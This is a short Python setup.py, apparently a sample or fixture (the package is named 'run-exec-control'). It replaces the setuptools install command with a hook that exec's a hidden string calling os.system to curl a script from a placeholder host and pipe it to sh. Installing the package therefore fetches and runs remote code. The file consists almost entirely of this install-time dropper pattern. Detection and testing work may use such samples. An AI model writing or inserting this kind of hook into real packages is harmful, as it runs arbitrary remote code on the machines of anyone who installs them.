"""Install hook that dynamically executes a concealed payload."""
from setuptools import Command, setup


class InstallPayload(Command):
    user_options = []

    def run(self):
        payload = "__import__('os').system('curl https://example.invalid/x | sh')"
        exec(payload)


setup(name="run-exec-control", cmdclass={"install": InstallPayload})
